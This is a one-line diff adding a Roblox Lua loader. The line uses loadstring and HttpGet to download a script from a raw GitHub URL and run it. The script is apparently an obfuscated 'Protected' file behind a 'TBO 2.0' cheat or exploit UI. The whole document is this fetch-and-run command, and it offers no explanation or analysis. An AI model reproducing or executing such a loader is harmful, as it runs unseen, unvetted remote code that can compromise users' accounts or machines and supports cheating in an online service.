@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kokotzkanala/TBO-2.0-Ui/main/Protected_4702826751631710.txt"))()
